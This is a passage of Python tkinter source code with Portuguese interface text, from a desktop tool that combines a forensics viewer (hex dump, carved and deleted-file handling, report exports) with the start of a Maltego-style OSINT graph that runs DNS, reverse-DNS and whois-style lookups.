        self.info_text.insert("1.0", f"══ DELETED FILE SELECIONADO ══\nNome: {vals[0]}\nCaminho Orig: {vals[1]}\nTamanho: {vals[2]}\nEstado: {vals[3]}\nMotivo: {vals[4]}\nRecuperável: {vals[5]}\n\nPara recuperar:\n- Se pasta: copiar manualmente\n- Se imagem raw + pytsk3: usar icat ou tsk_recover\n- Se carved: extrair via offset no HEX VIEWER")
    
    def on_carved_select(self):
        sel = self.carving_tree.selection()
        if not sel:
            return
        vals = self.carving_tree.item(sel[0], "values")
        offset_str = vals[0].split()[0]
        try:
            offset = int(offset_str)
            self.hex_offset_entry.delete(0, "end")
            self.hex_offset_entry.insert(0, str(offset))
            self.nb.select(self.tab_hex)
            self.goto_hex_offset()
        except:
            pass
    
    def on_string_select(self):
        sel = self.str_tree.selection()
        if not sel:
            return
        vals = self.str_tree.item(sel[0], "values")
        offset_str = vals[0].split()[0]
        self.hex_offset_entry.delete(0, "end")
        self.hex_offset_entry.insert(0, offset_str)
    
    def goto_hex_offset(self):
        txt = self.hex_offset_entry.get().strip()
        if not txt:
            return
        try:
            if txt.lower().startswith("0x"):
                offset = int(txt, 16)
            else:
                try:
                    offset = int(txt)
                except:
                    offset = int(txt, 16)
            if not self.file_path or self.is_folder:
                sel = self.files_tree.selection()
                if sel:
                    vals = self.files_tree.item(sel[0], "values")
                    for entry in self.file_list:
                        if entry["name"] in vals[0] and entry["path"] in vals[1]:
                            if os.path.exists(entry["full_path"]):
                                with open(entry["full_path"], "rb") as f:
                                    f.seek(offset)
                                    data = f.read(512)
                                    self.show_hex_dump(data, offset, entry["full_path"])
                                return
                messagebox.showwarning("Aviso", "Selecione ficheiro na aba FILESYSTEM para ver HEX.")
                return
            else:
                with open(self.file_path, "rb") as f:
                    f.seek(offset)
                    data = f.read(1024)
                    self.show_hex_dump(data, offset, self.file_path)
        except Exception as e:
            messagebox.showerror("Erro HEX", str(e))
    
    def hex_selected_file(self):
        if self.is_folder:
            sel = self.files_tree.selection()
            if not sel:
                messagebox.showwarning("Aviso", "Selecione ficheiro na aba FILESYSTEM.")
                return
            vals = self.files_tree.item(sel[0], "values")
            for entry in self.file_list:
                if entry["name"] in vals[0] and entry["path"][:20] in vals[1][:20]:
                    try:
                        with open(entry["full_path"], "rb") as f:
                            data = f.read(2048)
                            self.show_hex_dump(data, 0, entry["full_path"])
                            self.nb.select(self.tab_hex)
                        return
                    except Exception as e:
                        messagebox.showerror("Erro", str(e))
                        return
        else:
            self.hex_offset_entry.delete(0, "end")
            self.hex_offset_entry.insert(0, "0")
            self.goto_hex_offset()
    
    def show_hex_dump(self, data, base_offset, path_hint=""):
        if not data:
            self.hex_text.delete("1.0", "end")
            self.hex_text.insert("1.0", "Sem dados neste offset.")
            return
        lines = []
        lines.append(f"══ HEX DUMP: {path_hint} @ offset {base_offset} (0x{base_offset:X}) ══\n")
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_part = " ".join(f"{b:02X}" for b in chunk)
            hex_part = hex_part.ljust(47)
            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            lines.append(f"{base_offset+i:08X}  {hex_part}  |{ascii_part}|")
        out = "\n".join(lines)
        self.hex_text.delete("1.0", "end")
        self.hex_text.insert("1.0", out)
    
    def extract_selected_file(self):
        sel = self.files_tree.selection()
        if not sel and not self.deleted_tree.selection():
            messagebox.showwarning("Aviso", "Selecione ficheiro em FILESYSTEM ou DELETED.")
            return
        if sel:
            vals = self.files_tree.item(sel[0], "values")
            for entry in self.file_list:
                if entry["name"] in vals[0]:
                    src = entry["full_path"]
                    if self.is_folder and os.path.exists(src):
                        dst = filedialog.asksaveasfilename(initialfile=entry["name"], title="Extrair ficheiro para")
                        if dst:
                            try:
                                shutil.copy2(src, dst)
                                messagebox.showinfo("Extraído", f"Ficheiro extraído para {dst}")
                            except Exception as e:
                                messagebox.showerror("Erro", str(e))
                        return
                    elif not self.is_folder and "offset" in src:
                        try:
                            offset = int(src.split(":")[1])
                            dst = filedialog.asksaveasfilename(initialfile=entry["name"], title="Extrair carved")
                            if dst:
                                with open(self.file_path, "rb") as fin, open(dst, "wb") as fout:
                                    fin.seek(offset)
                                    fout.write(fin.read(entry["size"]))
                                messagebox.showinfo("Extraído", f"Carved extraído: {dst}")
                        except Exception as e:
                            messagebox.showerror("Erro", str(e))
                        return
        sel_d = self.deleted_tree.selection()
        if sel_d:
            messagebox.showinfo("Recuperação", "Para recuperar apagados de imagem raw:\n- Com pytsk3: use tsk_recover ou icat\n- Com SleuthKit: fls -r -d imagem.raw | icat\n- Se for pasta: verifique $Recycle.Bin ou use shadow copies")
    
    def clear_all(self):
        for tree in [self.files_tree, self.timeline_tree, self.deleted_tree, self.carving_tree, self.str_tree, self.hash_tree, self.search_tree]:
            try:
                tree.delete(*tree.get_children())
            except:
                pass
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", "Limpo. Selecione nova evidência.")
        self.hex_text.delete("1.0", "end")
        self.hex_text.insert("1.0", "Hex Viewer limpo.")
        self.file_list = []
        self.deleted_list = []
        self.carved_files = []
        self.strings_ascii = []
        self.stats_label.configure(text="Limpo | Selecione imagem ou pasta")
    
    def export_txt(self):
        if not self.file_list and not self.last_report:
            messagebox.showwarning("Aviso", "Nada para exportar. Analise primeiro.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT", "*.txt")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.last_report + "\n\n")
                f.write("══ FILE LIST ══\n")
                for e in self.file_list[:5000]:
                    f.write(f"{e['path']} | {e['size']} | {e['type']} | {e['status']} | {e['info']}\n")
                f.write("\n══ DELETED ══\n")
                for e in self.deleted_list[:2000]:
                    f.write(f"{e['path']} | {e['size']} | {e['status']}\n")
                f.write("\n══ CARVED ══\n")
                for c in self.carved_files[:1000]:
                    f.write(f"{c['offset']} {c['type']} {c['ext']} {c['info']}\n")
                f.write("\n══ STRINGS (amostra) ══\n")
                for s in self.strings_ascii[:2000]:
                    f.write(f"{s['offset']}: {s['string'][:100]} [{s['context']}]\n")
            messagebox.showinfo("Exportado", f"TXT guardado em {os.path.basename(path)}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))
    
    def export_json(self):
        if not self.file_list:
            messagebox.showwarning("Aviso", "Analise primeiro.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON", "*.json")])
        if not path:
            return
        try:
            data = {
                "source": self.file_path,
                "fs_type": self.fs_type,
                "size": self.file_size,
                "hashes": self.hashes,
                "entropy": self.entropy,
                "analyzed_at": datetime.datetime.now().isoformat(),
                "files": self.file_list[:5000],
                "deleted": self.deleted_list[:2000],
                "carved": self.carved_files[:1000],
                "strings_sample": self.strings_ascii[:1000],
            }
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            messagebox.showinfo("Exportado", f"JSON guardado: {os.path.basename(path)}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))
    
    def export_csv(self):
        if not self.file_list:
            messagebox.showwarning("Aviso", "Analise primeiro.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if not path:
            return
        try:
            import csv
            with open(path, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["Nome", "Caminho", "Tamanho", "Tipo", "Modificado", "Estado", "Info"])
                for e in self.file_list[:10000]:
                    mtime = datetime.datetime.fromtimestamp(e["mtime"]).strftime("%Y-%m-%d %H:%M:%S") if e["mtime"] else ""
                    w.writerow([e["name"], e["path"], e["size"], e["type"], mtime, e["status"], e["info"]])
            messagebox.showinfo("Exportado", f"CSV guardado: {os.path.basename(path)}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))
    
    def copy_selected(self):
        tab = self.nb.select()
        widget = self.nametowidget(tab)
        for child in widget.winfo_children():
            if isinstance(child, tk.Frame):
                for sub in child.winfo_children():
                    if isinstance(sub, ttk.Treeview):
                        sel = sub.selection()
                        if sel:
                            vals = sub.item(sel[0], "values")
                            txt = " | ".join(map(str, vals))
                            self.clipboard_clear()
                            self.clipboard_append(txt)
                            self.stats_label.configure(text=f"Copiado: {txt[:80]}")
                            return
        self.clipboard_clear()
        self.clipboard_append(self.info_text.get("1.0", "end-1c")[:5000])
        self.stats_label.configure(text="Relatório copiado")






class MaltegoTool(ToolWindow):
    """Maltego-like - OSINT Graph Investigação - Entidades e Transforms"""
    ENTITY_TYPES = {
        "Pessoa": {"color": "#ff6b6b", "icon": "👤", "desc": "Nome real"},
        "Email": {"color": "#4da6ff", "icon": "📧", "desc": "Endereço email"},
        "Domínio": {"color": "#00e5ff", "icon": "🌐", "desc": "ex: google.com"},
        "DNS Name": {"color": "#00e5ff", "icon": "🔗", "desc": "sub.dominio.com"},
        "IPv4": {"color": "#4dff88", "icon": "💻", "desc": "IP v4"},
        "Telefone": {"color": "#ffb700", "icon": "📞", "desc": "+351..."},
        "Localização": {"color": "#ffcc4d", "icon": "📍", "desc": "Cidade/País"},
        "Empresa": {"color": "#cc88ff", "icon": "🏢", "desc": "Organização"},
        "Website": {"color": "#88ffcc", "icon": "🌍", "desc": "URL https://"},
        "Social": {"color": "#ff88cc", "icon": "👥", "desc": "Instagram/FB/LinkedIn"},
        "Hash": {"color": "#a0a0a0", "icon": "#️⃣", "desc": "MD5/SHA256"},
        "Documento": {"color": "#ffd700", "icon": "📄", "desc": "PDF/DOC"},
    }
    TRANSFORMS = {
        "Domínio": [
            ("To IP [DNS]", "domain_to_ip"),
            ("To WHOIS", "domain_to_whois"),
            ("To Subdomains [crt.sh]", "domain_to_subdomains"),
            ("To Emails [scrape]", "domain_to_emails"),
            ("To NS/MX", "domain_to_mx"),
        ],
        "DNS Name": [
            ("To IP [DNS]", "domain_to_ip"),
            ("To WHOIS", "domain_to_whois"),
            ("To Subdomains", "domain_to_subdomains"),
        ],
        "IPv4": [
            ("To Reverse DNS", "ip_to_reverse"),
            ("To GeoIP", "ip_to_geo"),
            ("To WHOIS", "ip_to_whois"),
        ],
        "Email": [
            ("To Domain", "email_to_domain"),
            ("To Gravatar/Social", "email_to_social"),
        ],
        "Pessoa": [
            ("To Email (mock)", "person_to_email"),
            ("To Social Profiles", "person_to_social"),
        ],
        "Website": [
            ("To Domain", "website_to_domain"),
            ("To IP", "website_to_ip"),
            ("To Links", "website_to_links"),
        ],
        "Empresa": [
            ("To Domain", "company_to_domain"),
            ("To Emails", "company_to_emails"),
        ],
        "Telefone": [
            ("To Carrier/Loc", "phone_to_info"),
        ],
    }

    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Maltego - OSINT Graph", "1350x850")
        self.nodes = {}  # id -> dict
        self.edges = []  # list dict
        self.node_counter = 0
        self.selected_node = None
        self.drag_data = {"x": 0, "y": 0, "id": None}
        self.zoom = 1.0
        self.config_file = os.path.join(BASE_DIR, "maltego_config.json")
        self.config = self.load_config()

        # Top bar
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=8, pady=6)

        tk.Label(top, text="MALTEGO-CE // OSINT", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")

        for txt, cmd in [("🆕 NOVO", self.new_graph), ("💾 GUARDAR", self.save_graph), ("📂 CARREGAR", self.load_graph), ("🔄 AUTO-LAYOUT", self.auto_layout), ("🧹 LIMPAR", self.clear_graph), ("📸 EXPORT PNG", self.export_png), ("⚙️ CONFIG", self.open_config)]:
            b = tk.Button(top, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=3)
            style_button(b)

        # Transform quick run
        self.transform_var = tk.StringVar(value="Selecione entidade → clique direito → Run Transform")
        tk.Label(top, textvariable=self.transform_var, bg="#0a1a0f", fg="#00ff88", font=(FONT_MONO, 7, "bold"), wraplength=350, justify="left").pack(side="left", padx=10, fill="x", expand=True)

        # Main paned
        paned = tk.PanedWindow(self, orient="horizontal", bg=BG, sashwidth=6)
        paned.pack(fill="both", expand=True, padx=8, pady=(0,6))

        # Left palette
        left = tk.Frame(paned, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=180)
        paned.add(left, width=190)
        tk.Label(left, text="ENTIDADES", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=6)
        tk.Label(left, text="Arrasta ou clica para adicionar", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 6)).pack()

        self.entity_search = tk.Entry(left, font=(FONT_MONO, 8), bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.entity_search.pack(pady=4, padx=6, ipady=3)
        self.entity_search.insert(0, "filtrar...")
        self.entity_search.bind("<FocusIn>", lambda e: self.entity_search.delete(0, "end") if "filtrar" in self.entity_search.get() else None)
        self.entity_search.bind("<KeyRelease>", lambda e: self.refresh_palette())

        self.palette_frame = tk.Frame(left, bg=PANEL_BG)
        self.palette_frame.pack(fill="both", expand=True, padx=4, pady=4)
        self.palette_buttons = []
        self.refresh_palette()

        # Center canvas
        center = tk.Frame(paned, bg="#080c14", highlightthickness=1, highlightbackground=ACCENT_DIM)
        paned.add(center, stretch="always")

        canvas_toolbar = tk.Frame(center, bg=BG)
        canvas_toolbar.pack(fill="x", pady=2)
        tk.Label(canvas_toolbar, text="GRAPH:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(side="left", padx=4)
        self.graph_stats = tk.Label(canvas_toolbar, text="0 entidades | 0 ligações", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.graph_stats.pack(side="left", padx=6)
        tk.Label(canvas_toolbar, text="Dica: duplo clique vazio = nova entidade | direito em entidade = Transforms", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 6)).pack(side="right", padx=6)

        # Canvas with scrollbars
        canvas_frame = tk.Frame(center, bg="#080c14")
        canvas_frame.pack(fill="both", expand=True)

        self.canvas = tk.Canvas(canvas_frame, bg="#0a0f1a", highlightthickness=0, width=800, height=600)
        hsb = ttk.Scrollbar(canvas_frame, orient="horizontal", command=self.canvas.xview)
        vsb = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.canvas.yview)
        self.canvas.configure(xscrollcommand=hsb.set, yscrollcommand=vsb.set)
        self.canvas.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        canvas_frame.grid_rowconfigure(0, weight=1)
        canvas_frame.grid_columnconfigure(0, weight=1)
        self.canvas.configure(scrollregion=(0,0,3000,2000))

        self.canvas.bind("<Button-1>", self.canvas_click)
        self.canvas.bind("<B1-Motion>", self.canvas_drag)
        self.canvas.bind("<ButtonRelease-1>", self.canvas_release)
        self.canvas.bind("<Double-Button-1>", self.canvas_double_click)
        self.canvas.bind("<Button-3>", self.canvas_right_click)
        self.canvas.bind("<Motion>", self.canvas_hover)

        # Right properties
        right = tk.Frame(paned, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=260)
        paned.add(right, width=280)

        tk.Label(right, text="PROPRIEDADES & TRANSFORMS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=6)

        # Selected info
        self.prop_text = scrolledtext.ScrolledText(right, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=10, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.prop_text.pack(fill="x", padx=6, pady=4)

        # Value entry to add
        add_frame = tk.Frame(right, bg=PANEL_BG)
        add_frame.pack(fill="x", padx=6, pady=4)
        tk.Label(add_frame, text="Valor:", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
        self.value_entry = tk.Entry(add_frame, font=(FONT_MONO, 9), bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.value_entry.pack(fill="x", ipady=4, pady=2)
        self.value_entry.bind("<Return>", lambda e: self.add_entity_from_entry())

        self.type_var = tk.StringVar(value="Domínio")
        type_combo = ttk.Combobox(add_frame, textvariable=self.type_var, values=list(self.ENTITY_TYPES.keys()), state="readonly", width=25)
        type_combo.pack(fill="x", pady=2)

        b_add = tk.Button(add_frame, text="➕ ADICIONAR ENTIDADE", command=self.add_entity_from_entry, bg="#0a1f15", fg="#00ff88", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, pady=6, cursor="hand2")
        b_add.pack(fill="x", pady=4)

        # Transforms list
        tk.Label(right, text="TRANSFORMS DISPONÍVEIS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=(8,2))
        self.trans_listbox = tk.Listbox(right, font=(FONT_MONO, 8), bg=BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=10, selectbackground=ACCENT_DIM, selectforeground=ACCENT)
        self.trans_listbox.pack(fill="both", expand=True, padx=6, pady=2)
        self.trans_listbox.bind("<Double-Button-1>", lambda e: self.run_selected_transform())

        b_run = tk.Button(right, text="▶ RUN TRANSFORM", command=self.run_selected_transform, bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, pady=6, cursor="hand2")
        b_run.pack(fill="x", padx=6, pady=4)

        # Log bottom
        log_frame = tk.Frame(right, bg=PANEL_BG)
        log_frame.pack(fill="both", expand=True, padx=6, pady=4)
        tk.Label(log_frame, text="LOG / OUTPUT", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
        self.log_text = scrolledtext.ScrolledText(log_frame, font=(FONT_MONO, 7), bg="#05080d", fg=TEXT_DIM, height=8, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.log_text.pack(fill="both", expand=True, pady=2)
        self.log_text.insert("1.0", "Maltego CE OSINT pronto.\nAdicione domínio/IP/email para começar transforms.\n")

        # Context menu
        self.context_menu = tk.Menu(self, tearoff=0, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9))
        # bottom export bar
        bottom = tk.Frame(self, bg=BG)
        bottom.pack(fill="x", padx=8, pady=(0,8))
        for txt, cmd in [("📋 COPIAR SELECIONADO", self.copy_selected), ("🔗 EXPORTAR GRAPHML", self.export_graphml), ("📄 RELATÓRIO TXT", self.export_report), ("🎯 OSINIT BUSCA", self.send_to_osint)]:
            b = tk.Button(bottom, text=txt, command=cmd)
            b.pack(side="left", padx=4, ipady=4, fill="x", expand=True)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        # Initial demo nodes if empty
        self.after(300, self.create_demo_graph)

    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                return {}
        return {"apis": {"shodan": "", "virustotal": "", "whois_api": ""}, "transforms_enabled": {}}

    def save_config(self):
        try:
            with open(self.config_file, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def refresh_palette(self):
        for w in self.palette_frame.winfo_children():
            w.destroy()
        filt = self.entity_search.get().lower()
        if "filtrar" in filt:
            filt = ""
        for etype, info in self.ENTITY_TYPES.items():
            if filt and filt not in etype.lower() and filt not in info["desc"].lower():
                continue
            b = tk.Button(self.palette_frame, text=f"{info['icon']}  {etype}", anchor="w", padx=8, bg=BTN_BG, fg=info["color"], font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, pady=6, cursor="hand2", command=lambda t=etype: self.add_entity_type(t))
            b.pack(fill="x", pady=1)
            style_button(b)
            b.bind("<Enter>", lambda e, btn=b, col=info["color"]: btn.configure(bg=BTN_BG_HOVER))
            b.bind("<Leave>", lambda e, btn=b: btn.configure(bg=BTN_BG))

    def log(self, msg):
        self.log_text.insert("end", f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see("end")

    def add_entity_type(self, etype):
        # add at random position
        x = random.randint(200, 800)
        y = random.randint(100, 600)
        self.add_node(etype, f"novo {etype.lower()}", x, y)

    def add_entity_from_entry(self):
        val = self.value_entry.get().strip()
        if not val:
            messagebox.showwarning("Aviso", "Insira valor (ex: google.com, 8.8.8.8, teste@gmail.com)")
            return
        etype = self.type_var.get()
        # auto-detect type if generic
        detected = self.auto_detect_type(val)
        if detected != etype:
            # suggest but keep user choice? auto switch if user left default?
            if self.value_entry.get() != "":
                # if user typed email but selected dominio, auto correct
                if detected in self.ENTITY_TYPES:
                    etype = detected
                    self.type_var.set(detected)
        x = random.randint(300, 900)
        y = random.randint(150, 650)
        self.add_node(etype, val, x, y)
        self.value_entry.delete(0, "end")

    def auto_detect_type(self, val):
        val = val.strip()
        if "@" in val and "." in val:
            return "Email"
        if val.startswith("http://") or val.startswith("https://"):
            return "Website"
        # IP check
        try:
            socket.inet_aton(val)
            if val.count(".") == 3:
                return "IPv4"
        except Exception:
            pass
        if val.startswith("+") and any(c.isdigit() for c in val):
            return "Telefone"
        if "." in val and " " not in val:
            # domain like
            if len(val.split(".")) >= 2:
                return "Domínio"
        if val.replace(" ", "").isalpha() and len(val.split()) >= 2:
            return "Pessoa"
        return "Domínio"

    def add_node(self, etype, value, x, y, extra=None):
        self.node_counter += 1
        nid = f"n{self.node_counter}"
        info = self.ENTITY_TYPES.get(etype, {"color": "#ffffff", "icon": "❓"})
        node = {
            "id": nid,
            "type": etype,
            "value": value,
            "x": x,
            "y": y,
            "color": info["color"],
            "icon": info["icon"],
            "data": extra or {},
            "created": datetime.datetime.now().isoformat()
        }
        self.nodes[nid] = node
        self.draw_graph()
        self.select_node(nid)
        self.log(f"Entidade adicionada: [{etype}] {value}")
        self.update_stats()
        return nid

    def add_edge(self, from_id, to_id, label, transform=""):
        # avoid duplicate
        for e in self.edges:
            if e["from"] == from_id and e["to"] == to_id and e["label"] == label:
                return
        edge = {"from": from_id, "to": to_id, "label": label, "transform": transform, "created": datetime.datetime.now().isoformat()}
        self.edges.append(edge)
        self.draw_graph()
        self.update_stats()

    def draw_graph(self):
        self.canvas.delete("all")
        # draw edges first
        for edge in self.edges:
            f = self.nodes.get(edge["from"])
            t = self.nodes.get(edge["to"])
            if not f or not t:
                continue
            self.canvas.create_line(f["x"], f["y"], t["x"], t["y"], fill="#1a2a3a", width=2, arrow="last", arrowshape=(8,10,4), tags="edge")
            mx = (f["x"] + t["x"])/2
            my = (f["y"] + t["y"])/2
            self.canvas.create_text(mx, my-8, text=edge["label"], font=(FONT_MONO, 6), fill="#5e7a85", tags="edge_label")

        # draw nodes
        for nid, node in self.nodes.items():
            x, y = node["x"], node["y"]
            color = node["color"]
            is_selected = (nid == self.selected_node)
            # shadow
            self.canvas.create_oval(x-28, y-28, x+28, y+28, fill="#000000", outline="", tags=("node", nid))
            # circle
            fill = color if not is_selected else "#ffffff"
            outline = ACCENT if is_selected else color
            width = 3 if is_selected else 2
            self.canvas.create_oval(x-24, y-24, x+24, y+24, fill=BG, outline=outline, width=width, tags=("node", nid))
            self.canvas.create_text(x, y-4, text=node["icon"], font=(FONT_MONO, 12), fill=color, tags=("node", nid))
            # label
            label = node["value"][:22] + ("..." if len(node["value"])>22 else "")
            self.canvas.create_text(x, y+32, text=label, font=(FONT_MONO, 7, "bold"), fill=TEXT if not is_selected else ACCENT, tags=("node", nid))
            self.canvas.create_text(x, y+42, text=node["type"], font=(FONT_MONO, 6), fill=TEXT_DIM, tags=("node", nid))

    def canvas_click(self, event):
        x = self.canvas.canvasx(event.x)
        y = self.canvas.canvasy(event.y)
        # check node hit
        clicked = None
        for nid, node in self.nodes.items():
            if abs(node["x"]-x) < 30 and abs(node["y"]-y) < 30:
                clicked = nid
                break
        if clicked:
            self.select_node(clicked)
            self.drag_data = {"x": x, "y": y, "id": clicked}
        else:
            self.selected_node = None
            self.prop_text.delete("1.0", "end")
            self.trans_listbox.delete(0, "end")
            self.draw_graph()

    def canvas_drag(self, event):
        if not self.drag_data["id"]:
            return
        x = self.canvas.canvasx(event.x)
        y = self.canvas.canvasy(event.y)
        nid = self.drag_data["id"]
        node = self.nodes.get(nid)
        if node:
            node["x"] = x
            node["y"] = y
            self.draw_graph()

    def canvas_release(self, event):
        self.drag_data = {"x":0,"y":0,"id":None}

    def canvas_double_click(self, event):
        x = self.canvas.canvasx(event.x)
        y = self.canvas.canvasy(event.y)
        # check not on node
        for nid, node in self.nodes.items():
            if abs(node["x"]-x) < 30 and abs(node["y"]-y) < 30:
                return
        # add new entity dialog
        self.type_var.set("Domínio")
        self.value_entry.focus_set()

    def canvas_right_click(self, event):
        x = self.canvas.canvasx(event.x)
        y = self.canvas.canvasy(event.y)
        clicked = None
        for nid, node in self.nodes.items():
            if abs(node["x"]-x) < 30 and abs(node["y"]-y) < 30:
                clicked = nid
                break
        if not clicked:
            return
        self.select_node(clicked)
        self.context_menu.delete(0, "end")
        node = self.nodes[clicked]
        self.context_menu.add_command(label=f"{node['icon']} {node['type']}: {node['value'][:30]}", state="disabled")
        self.context_menu.add_separator()
        transforms = self.TRANSFORMS.get(node["type"], [])
        if not transforms:
            transforms = [("To Domain (generic)", "generic_to_domain")]
        for label, func in transforms:
            self.context_menu.add_command(label=f"▶ {label}", command=lambda f=func, l=label, nid=clicked: self.execute_transform(nid, f, l))
        self.context_menu.add_separator()
        self.context_menu.add_command(label="📋 Copiar valor", command=lambda: self.copy_node_value(clicked))
        self.context_menu.add_command(label="❌ Remover entidade", command=lambda: self.remove_node(clicked))
        self.context_menu.add_command(label="🔍 OSINT no Navegador", command=lambda: self.osint_browser(clicked))
        try:
            self.context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            self.context_menu.grab_release()

    def canvas_hover(self, event):
        x = self.canvas.canvasx(event.x)
        y = self.canvas.canvasy(event.y)
        for nid, node in self.nodes.items():
            if abs(node["x"]-x) < 30 and abs(node["y"]-y) < 30:
                self.canvas.configure(cursor="hand2")
                return
        self.canvas.configure(cursor="")

    def select_node(self, nid):
        self.selected_node = nid
        node = self.nodes.get(nid)
        if not node:
            return
        self.prop_text.delete("1.0", "end")
        self.prop_text.insert("1.0", f"ID: {nid}\nTipo: {node['type']}\nValor: {node['value']}\nCor: {node['color']}\nCriado: {node['created'][:19]}\n\nDados extra:\n{json.dumps(node['data'], indent=2, ensure_ascii=False)}\n\nConexões: {len([e for e in self.edges if e['from']==nid or e['to']==nid])}")
        self.trans_listbox.delete(0, "end")
        transforms = self.TRANSFORMS.get(node["type"], [])
        for label, func in transforms:
            self.trans_listbox.insert("end", f"{label} [{func}]")
        self.transform_var.set(f"Selecionado: [{node['type']}] {node['value']} → {len(transforms)} transforms")
        self.draw_graph()

    def remove_node(self, nid):
        if nid in self.nodes:
            del self.nodes[nid]
            self.edges = [e for e in self.edges if e["from"] != nid and e["to"] != nid]
            self.selected_node = None
            self.draw_graph()
            self.update_stats()
            self.log(f"Entidade removida: {nid}")

    def copy_node_value(self, nid):
        node = self.nodes.get(nid)
        if node:
            self.clipboard_clear()
            self.clipboard_append(node["value"])
            self.log(f"Copiado: {node['value']}")

    def osint_browser(self, nid):
        node = self.nodes.get(nid)
        if not node:
            return
        val = node["value"]
        url = ""
        if node["type"] == "Domínio" or node["type"] == "DNS Name":
            url = f"https://who.is/whois/{val}"
        elif node["type"] == "IPv4":
            url = f"https://whatismyipaddress.com/ip/{val}"
        elif node["type"] == "Email":
            url = f"https://www.google.com/search?q=\"{val}\""
        elif node["type"] == "Pessoa":
            url = f"https://www.google.com/search?q=\"{val}\""
        elif node["type"] == "Website":
            url = val if val.startswith("http") else f"https://{val}"
        else:
            url = f"https://www.google.com/search?q=\"{val}\""
        try:
            webbrowser.open(url)
            self.log(f"Browser: {url}")
        except Exception as e:
            self.log(f"Erro browser: {e}")

    def run_selected_transform(self):
        if not self.selected_node:
            messagebox.showwarning("Aviso", "Selecione uma entidade primeiro.")
            return
        sel = self.trans_listbox.curselection()
        if not sel:
            # run first
            if self.trans_listbox.size() > 0:
                self.trans_listbox.selection_set(0)
                sel = (0)
            else:
                return
        txt = self.trans_listbox.get(sel[0])
        # extract func name from [func]
        import re
        m = re.search(r'\[(.*?)\]', txt)
        func = m.group(1) if m else "domain_to_ip"
        label = txt.split("[")[0].strip()
        self.execute_transform(self.selected_node, func, label)

    def execute_transform(self, nid, func_name, label):
        node = self.nodes.get(nid)
        if not node:
            return
        self.log(f"▶ Transform: {label} em [{node['type']}] {node['value']}")
        self.transform_var.set(f"Executando: {label} em {node['value']}...")
        threading.Thread(target=self.transform_worker, args=(nid, func_name, label), daemon=True).start()

    def transform_worker(self, nid, func_name, label):
        try:
            node = self.nodes.get(nid)
            if not node:
                return
            val = node["value"]
            new_entities = []

            if func_name == "domain_to_ip":
                try:
                    ip = socket.gethostbyname(val.replace("https://","").replace("http://","").split("/")[0])
                    new_entities.append(("IPv4", ip, f"DNS A {val} → {ip}"))
                except Exception as e:
                    self.after(0, lambda: self.log(f"DNS falhou {val}: {e}"))

            elif func_name == "ip_to_reverse":
                try:
                    rev = socket.gethostbyaddr(val)[0]
                    new_entities.append(("DNS Name", rev, f"PTR {val} → {rev}"))
                except Exception as e:
                    self.after(0, lambda: self.log(f"Reverse DNS falhou: {e}"))

            elif func_name == "email_to_domain":
                if "@" in val:
                    dom = val.split("@")[-1]
                    new_entities.append(("Domínio", dom, f"Email → Domain"))

            elif func_name == "website_to_domain":
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(val if "://" in val else "https://"+val)
                    dom = parsed.netloc or parsed.path
                    if dom:
                        new_entities.append(("Domínio", dom, "Website → Domain"))
